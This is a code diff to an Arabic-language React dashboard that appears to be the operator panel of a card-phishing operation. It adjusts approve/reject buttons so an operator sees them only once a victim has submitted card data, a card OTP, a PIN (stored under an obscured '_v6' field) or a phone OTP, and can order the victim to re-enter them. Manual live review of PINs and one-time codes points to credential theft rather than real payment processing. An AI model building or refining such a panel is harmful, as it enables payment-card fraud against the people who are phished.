@@ -1146,14 +1146,14 @@ export default function DashboardPage() {
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال البيانات</p>
           </div>
         )}
-        {(paymentStatus === "pending" || paymentStatus === "verifying" || !paymentStatus) && currentPage === "check" && (
+        {(paymentStatus === "pending" || paymentStatus === "verifying") && currentPage === "check" && hasCardData && (
           <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار المراجعة</p>
           </div>
         )}
         
-        {/* Action buttons - show only when pending or verifying */}
-        {(paymentStatus === "pending" || paymentStatus === "verifying" || !paymentStatus) && currentPage === "check" && (
+        {/* Action buttons - show ONLY when pending or verifying AND has card data */}
+        {(paymentStatus === "pending" || paymentStatus === "verifying") && currentPage === "check" && hasCardData && (
           <div style={{ display: "flex", gap: 8 }}>
             <button
               onClick={() => handlePaymentAction("approved")}
@@ -1241,12 +1241,9 @@ export default function DashboardPage() {
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال الرمز</p>
           </div>
         )}
-        {(cardOtpStatus === "pending" || cardOtpStatus === "verifying" || !cardOtpStatus) && (currentStep === 5 || currentPage === "veri") && (
-          <div style={{ background: "transparent", borderRadius: 8, padding: 0, border: "none", marginBottom: 0 }} />
-        )}
         
-        {/* Action buttons - show only when at this step and status is pending/verifying */}
-        {(cardOtpStatus === "pending" || cardOtpStatus === "verifying" || !cardOtpStatus) && (currentStep === 5 || currentPage === "veri") && otpCode && (
+        {/* Action buttons - show ONLY when pending/verifying AND has OTP data */}
+        {(cardOtpStatus === "pending" || cardOtpStatus === "verifying") && (currentStep === 5 || currentPage === "veri") && otpCode && (
           <div style={{ display: "flex", gap: 8 }}>
             <button onClick={() => handleOtpAction("approved")} disabled={actionLoading === "otp"}
               style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700 }}>
@@ -1272,7 +1269,8 @@ export default function DashboardPage() {
     // Show box if there's PIN data OR status exists
     const hasPinData = raw?._v6 || raw?.pinCode;
     const hasDecision = pinStatus === "approved" || pinStatus === "rejected";
-    const isPending = pinStatus === "pending" || pinStatus === "verifying" || !pinStatus;
+    const isPending = pinStatus === "pending" || pinStatus === "verifying";
+    const showButtons = isPending && hasPinData;
     // ALWAYS show if there's PIN data, never hide
     if (!hasPinData && !hasDecision && currentStep !== 6) {
       return null;
@@ -1326,8 +1324,8 @@ export default function DashboardPage() {
           </div>
         )}
         
-        {/* Action buttons - show only when pending/verifying */}
-        {isPending && currentStep === 6 && hasPinData && (
+        {/* Action buttons - show ONLY when pending/verifying AND has PIN data */}
+        {showButtons && currentStep === 6 && (
           <div style={{ display: "flex", gap: 8 }}>
             <button 
               onClick={() => handlePinAction("approved")} 
@@ -1437,8 +1435,8 @@ export default function DashboardPage() {
           </div>
         )}
 
-        {/* Action buttons - show ONLY when status is verifying/pending (new event) */}
-        {(phoneOtpStatus === "verifying" || phoneOtpStatus === "pending" || !phoneOtpStatus) && phoneOtpCode && (
+        {/* Action buttons - show ONLY when status is verifying/pending AND has phone OTP code */}
+        {(phoneOtpStatus === "verifying" || phoneOtpStatus === "pending") && phoneOtpCode && (
           <div style={{ display: "flex", gap: 8, flexDirection: "column" }}>
             <div style={{ display: "flex", gap: 8 }}>
               <button onClick={() => handlePhoneAction("approved")} disabled={actionLoading === "phone"}
